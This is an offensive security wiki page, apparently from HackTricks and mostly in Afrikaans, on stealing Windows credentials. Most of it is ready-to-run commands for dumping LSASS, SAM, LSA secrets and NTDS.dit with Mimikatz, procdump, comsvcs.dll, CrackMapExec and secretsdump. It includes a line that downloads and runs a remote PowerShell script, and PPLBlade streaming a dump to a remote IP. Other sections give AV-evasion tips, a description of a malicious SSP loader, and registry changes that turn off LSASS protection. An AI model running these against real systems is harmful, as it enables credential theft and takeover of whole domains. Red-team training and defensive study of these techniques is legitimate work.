# Diefstal van Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Vind ander dinge wat Mimikatz kan doen in** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Hierdie beskermings kan voorkom dat Mimikatz sekere credentials ontrek.**

## Credentials met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **na passwords en hashes te soek** binne die slagoffer.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Aangesien **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is 'n legitieme Microsoft hulpmiddel**, word dit nie deur Defender opgespoor nie.\
Jy kan hierdie hulpmiddel gebruik om **dump the lsass process**, **download the dump** en **extract** die **credentials locally** vanaf die dump.

Jy kan ook [SharpDump](https://github.com/GhostPack/SharpDump) gebruik.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Hierdie proses word outomaties uitgevoer met [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Sommige **AV** mag **detect** as **malicious** die gebruik van **procdump.exe to dump lsass.exe**; dit is omdat hulle **detecting** die string **"procdump.exe" and "lsass.exe"**. Dus is dit **stealthier** om as 'n **argument** die **PID** van lsass.exe aan procdump te **pass** **instead of** die **name lsass.exe.**

### Dumping lsass with **comsvcs.dll**

'n DLL met die naam **comsvcs.dll** wat gevind word in `C:\Windows\System32` is verantwoordelik vir **dumping process memory** in die geval van 'n crash. Hierdie DLL bevat 'n **function** met die naam **`MiniDumpW`**, bedoel om via `rundll32.exe` aangeroep te word.  
Dit is onbelangrik wat vir die eerste twee argumente gebruik word, maar die derde een is in drie komponente verdeel. Die process ID wat gedump moet word is die eerste komponent, die dump-lêer se ligging is die tweede, en die derde komponent is uitsluitlik die woord **full**. Geen alternatiewe opsies bestaan nie.  
Wanneer die DLL hierdie drie komponente ontleed, begin dit die dump-lêer skep en die geheue van die gespesifiseerde proses na hierdie lêer oordra.  
Gebruik van **comsvcs.dll** is geskik om die lsass-proses te dump, wat dus die behoefte om procdump op te laai en uit te voer oorskiet. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Die volgende opdrag word gebruik om dit uit te voer:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Regsklik op die Task Bar en klik op Task Manager
2. Klik op More details
3. Soek na "Local Security Authority Process" proses in die Processes tab
4. Regsklik op "Local Security Authority Process" proses en klik op "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-ondertekende binêre wat deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is 'n Protected Process Dumper Tool wat obfuscating van memory dumps en die transferring daarvan na remote workstations ondersteun sonder om dit op die disk neer te sit.

**Belangrikste funksies**:

1. Bypassing PPL protection
2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping sonder MiniDumpWriteDump

Ink Dragon verskaf 'n drie-fase dumper genaamd **LalsDumper** wat nooit `MiniDumpWriteDump` aanroep nie, sodat EDR hooks op daardie API nooit afvuur:

1. **Fase 1 lader (`lals.exe`)** – soek `fdp.dll` vir 'n plaashouer wat uit 32 klein `d`-karakters bestaan, oorskryf dit met die absolute pad na `rtu.txt`, stoor die gepatchte DLL as `nfdp.dll`, en roep `AddSecurityPackageA("nfdp","fdp")` aan. Dit dwing **LSASS** om die kwaadwillige DLL as 'n nuwe Security Support Provider (SSP) te laai.
2. **Fase 2 binne LSASS** – wanneer LSASS `nfdp.dll` laai, lees die DLL `rtu.txt`, XOR elke byte met `0x20`, en map die gedekodeerde blob in geheue voordat dit die uitvoering oordra.
3. **Fase 3 dumper** – die gemapte payload her-implementeer MiniDump-logika met behulp van **direct syscalls** wat opgelos is vanaf gehashede API-name (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). 'n Toegewyde export genaamd `Tom` open `%TEMP%\<pid>.ddt`, stroom 'n gekompresseerde LSASS dump in die lêer, en sluit die handle sodat eksfiltrasie later kan plaasvind.

Operateur notas:

* Hou `lals.exe`, `fdp.dll`, `nfdp.dll`, en `rtu.txt` in dieselfde gids. Fase 1 herskryf die hard-gekodeerde plaashouer met die absolute pad na `rtu.txt`, so om dit te skei breek die ketting.
* Registrasie gebeur deur `nfdp` by te voeg tot `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Jy kan daardie waarde self voorsien om LSASS te laat herlaai die SSP by elke opstart.
* `%TEMP%\*.ddt` lêers is gekompresseerde dumps. Pak dit lokaal uit, en voer dit dan na Mimikatz/Volatility vir credential onttrekking.
* Om `lals.exe` te hardloop vereis admin/SeTcb-regte sodat `AddSecurityPackageA` slaag; sodra die oproep terugkeer, laai LSASS deursigtig die rogue SSP en voer Fase 2 uit.
* Verwydering van die DLL van skyffstoor verwyder dit nie uit LSASS nie. Verwyder óf die registerinskrywing en herbegin LSASS (reboot) óf laat dit vir langtermyn persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump die NTDS.dit vanaf teiken DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump die NTDS.dit wagwoordgeskiedenis vanaf die geteikende DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wys die pwdLastSet-attribuut vir elke NTDS.dit-rekening
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Hierdie lêers behoort **geleë** te wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM_. Maar jy kan hulle **nie net op 'n gewone manier kopieer nie**, omdat hulle beskerm is.

### Vanaf die Register

Die maklikste manier om daardie lêers te steel is om 'n kopie uit die register te kry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Laai** daardie lêers na jou Kali-masjien en **onttrek die hashes** met behulp van:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Jy kan 'n kopie van beskermde lêers maak met behulp van hierdie diens. Jy moet Administrator wees.

#### Gebruik van vssadmin

Die vssadmin-binarie is slegs beskikbaar in Windows Server-weergawes
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Maar jy kan dieselfde doen vanaf **Powershell**. Dit is 'n voorbeeld van **hoe om die SAM file te kopieer** (die hardeskyf wat gebruik word is "C:" en dit word gestoor na C:\users\Public) maar jy kan dit gebruik om enige beskermde lêer te kopieer:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kode uit die boek: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om 'n kopie van SAM, SYSTEM en ntds.dit te maak.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Kredensiale - NTDS.dit**

Die **NTDS.dit**-lêer staan bekend as die hart van **Active Directory**, en bevat kritieke data oor gebruikersobjekte, groepe en hul lidmaatskappe. Dit is waar die **password hashes** vir domeingebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)** databasis en lê by _%SystemRoom%/NTDS/ntds.dit_.

Binnen hierdie databasis word drie primêre tabelle bewaar:

- **Data Table**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objekte soos gebruikers en groepe.
- **Link Table**: Dit hou rekord van verhoudings, soos groepslidmaatskappe.
- **SD Table**: **Security descriptors** vir elke objek word hier gehou, wat die beveiliging en toegangbeheer vir die gestoorde objekte verseker.

Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word deur _lsass.exe_ gebruik. Dan kan **'n deel** van die **NTDS.dit**-lêer in die **`lsass`**-geheue wees (jy kan moontlik die mees onlangs aangesproke data vind weens prestasieverbetering deur die gebruik van 'n **cache**).

#### Ontsleuteling van die hashes binne NTDS.dit

Die hash is 3 keer versleutel:

1. Ontsleutel Password Encryption Key (**PEK**) met die **BOOTKEY** en **RC4**.
2. Ontsleutel die hash met **PEK** en **RC4**.
3. Ontsleutel die hash met **DES**.

**PEK** het dieselfde waarde op elke domain controller, maar dit is versleutel in die **NTDS.dit**-lêer met behulp van die **BOOTKEY** van die **SYSTEM**-lêer van die domain controller (dit verskil tussen domain controllers). Dit is waarom om die kredensiale uit die NTDS.dit-lêer te kry, jy die lêers NTDS.dit en SYSTEM nodig het (_C:\Windows\System32\config\SYSTEM_).

### Kopieer NTDS.dit met Ntdsutil

Beskikbaar sedert Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Jy kan ook die [**volume shadow copy**](#stealing-sam-and-system) truuk gebruik om die **ntds.dit** file te kopieer. Onthou dat jy ook 'n kopie van die **SYSTEM file** nodig sal hê (weer, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) truuk).

### **Onttrekking van hashes uit NTDS.dit**

Sodra jy die **NTDS.dit** en **SYSTEM** lêers **verkry** het, kan jy gereedskap soos _secretsdump.py_ gebruik om **die hashes te onttrek**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Jy kan ook **hulle outomaties onttrek** met 'n geldige domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Vir **groot NTDS.dit-lêers** word aanbeveel om dit met [gosecretsdump](https://github.com/c-sto/gosecretsdump) uit te trek.

Laastens kan jy ook die **metasploit module** gebruik: _post/windows/gather/credentials/domain_hashdump_ of **mimikatz** `lsadump::lsa /inject`

### **Uittrekking van domeinobjekte uit NTDS.dit na 'n SQLite-databasis**

NTDS-objekte kan na 'n SQLite-databasis uitgehaal word met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie net die secrets word uitgehaal nie, maar ook die volledige objekte en hul attribuutte vir verdere inligtingsekstraksie wanneer die rou NTDS.dit-lêer reeds verkry is.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM` hive is opsioneel maar maak ontsleuteling van secrets moontlik (NT & LM hashes, supplemental credentials soos cleartext passwords, kerberos of trust keys, NT & LM password histories). Saam met ander inligting word die volgende data onttrek : user- en machine-accounts met hul hashes, UAC flags, tydstempel vir laaste logon en wagwoordverandering, rekeningbeskrywings, name, UPN, SPN, groepe en recursive memberships, organisasie-eenhedeboom en lidmaatskap, trusted domains met trusts type, direction en attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Jy kan hierdie binary gebruik om credentials uit verskeie software te onttrek.
```
lazagne.exe all
```
## Ander gereedskap om credentials uit SAM en LSASS te onttrek

### Windows credentials Editor (WCE)

Hierdie hulpmiddel kan gebruik word om credentials uit die geheugen te onttrek. Laai dit af van: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek credentials uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Ekstraheer credentials uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.

## Ontgin onaktiewe RDP-sessies en verswak sekuriteitskontroles

Ink Dragon’s FinalDraft RAT bevat `DumpRDPHistory` tasker waarvan die tegnieke handig is vir enige red-teamer:

### DumpRDPHistory-styl telemetrie-insameling

* **Outbound RDP targets** – ontleed elke gebruikershive by `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Elke subkey stoor die servernaam, `UsernameHint`, en die laaste skryftydstempel. Jy kan FinalDraft’s logika repliseer met PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21** (successful logon) and **25** (disconnect) to map who administered the box:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sodra jy weet watter Domain Admin gereeld koppel, dump LSASS (with LalsDumper/Mimikatz) terwyl hul **disconnected** sessie nog bestaan. CredSSP + NTLM fallback laat hul verifier en tokens in LSASS agter, wat dan oor SMB/WinRM herafgespeel kan word om `NTDS.dit` te gryp of om persistentie op domain controllers te plaas.

### Register-downgrades wat deur FinalDraft geteiken word
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Instelling van `DisableRestrictedAdmin=1` dwing volwaardige credential/ticket-hergebruik tydens RDP af, wat pass-the-hash style pivots moontlik maak.
* `LocalAccountTokenFilterPolicy=1` skakel UAC token-filtering af sodat local admins onbeperkte tokens oor die netwerk kry.
* `DSRMAdminLogonBehavior=2` laat die DSRM administrator aanmeld terwyl die DC aanlyn is, wat aanvallers nog 'n ingeboude rekening met hoë bevoegdhede gee.
* `RunAsPPL=0` verwyder LSASS PPL-beskerming, wat memory access triviaal maak vir dumpers soos LalsDumper.

## Verwysings

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
